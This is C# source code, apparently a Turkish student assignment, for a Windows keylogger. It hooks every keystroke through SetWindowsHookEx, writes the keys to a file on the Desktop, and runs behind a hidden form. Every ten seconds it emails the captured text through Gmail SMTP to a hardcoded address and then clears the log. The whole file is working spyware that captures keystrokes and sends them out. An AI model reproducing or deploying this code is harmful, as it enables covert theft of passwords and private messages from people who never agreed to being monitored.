using System;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyloggerOdev
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr hookID = IntPtr.Zero;
        private static string logFile = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            "keylog.txt"
        );
        private static DateTime lastEmailSent = DateTime.MinValue;
        private static readonly TimeSpan emailInterval = TimeSpan.FromSeconds(10); // 10 saniye
        private static System.Threading.Timer? emailTimer; // Timer için alan

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [STAThread]
        static void Main()
        {
            // İlk başta dosyayı oluştur
            try
            {
                if (!File.Exists(logFile))
                {
                    File.WriteAllText(logFile, "");
                    Console.WriteLine("Dosya oluşturuldu: " + logFile);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Dosya oluşturma hatası: " + ex.Message);
                return;
            }

            Console.WriteLine("KEYLOGGER ÇALIŞIYOR - F12 İLE ÇIK");
            Console.WriteLine("Keylog dosyası yolu: " + logFile);

            hookID = SetHook(HookCallback);
            if (hookID == IntPtr.Zero)
            {
                Console.WriteLine("HATA: Hook kurulamadı!");
                return;
            }

            // Timer ekle: 10 sn sonra başla, her 10 sn’de bir tekrar et
            emailTimer = new System.Threading.Timer(SendLogEmail, null, TimeSpan.FromSeconds(10), emailInterval);

            Application.Run(new Form() { Visible = false }); // Gizli form ile mesaj döngüsünü başlat
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            try
            {
                using var process = System.Diagnostics.Process.GetCurrentProcess();
                using var module = process.MainModule;
                if (module != null)
                {
                    IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(module.ModuleName), 0);
                    if (hook == IntPtr.Zero)
                    {
                        throw new Exception($"SetWindowsHookEx başarısız oldu. Hata kodu: {Marshal.GetLastWin32Error()}");
                    }
                    return hook;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Hook hatası: {ex.Message}");
            }
            return IntPtr.Zero;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // F12 tuşu (VK_F12 = 123)
                if (vkCode == 123)
                {
                    Console.WriteLine("\nÇIKILIYOR...");
                    Application.Exit();
                    return CallNextHookEx(hookID, nCode, wParam, lParam);
                }

                string keyText = "";

                if (vkCode == 32) keyText = " "; // Space
                else if (vkCode == 13) keyText = "\n"; // Enter
                else if (vkCode == 8) keyText = "[SIL]"; // Backspace
                else if (vkCode == 9) keyText = "[TAB]"; // Tab
                else if (vkCode >= 65 && vkCode <= 90) keyText = ((char)vkCode).ToString().ToLower();
                else if (vkCode >= 48 && vkCode <= 57) keyText = ((char)vkCode).ToString();
                else keyText = $"[{vkCode}]";

                Console.Write(keyText);
                try
                {
                    File.AppendAllText(logFile, keyText);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Dosya yazma hatası: " + ex.Message);
                }
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        private static void SendLogEmail(object? state)
        {
            try
            {
                if (!File.Exists(logFile) || (DateTime.Now - lastEmailSent) < emailInterval)
                    return;

                string logContent = File.ReadAllText(logFile);
                if (string.IsNullOrEmpty(logContent))
                    return;

                Console.WriteLine("\nMail gönderiliyor...");

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress("arba012344@gmail.com");
                    mail.To.Add("arba012344@gmail.com");
                    mail.Subject = "Keylogger Log";
                    mail.Body = logContent;

                    using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtp.Credentials = new System.Net.NetworkCredential("arba012344@gmail.com", "uygulama şifresi giriniz.");
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }

                lastEmailSent = DateTime.Now;
                File.WriteAllText(logFile, "");
                Console.WriteLine("Log e-posta ile gönderildi.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"E-posta gönderme hatası: {ex.Message}");
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
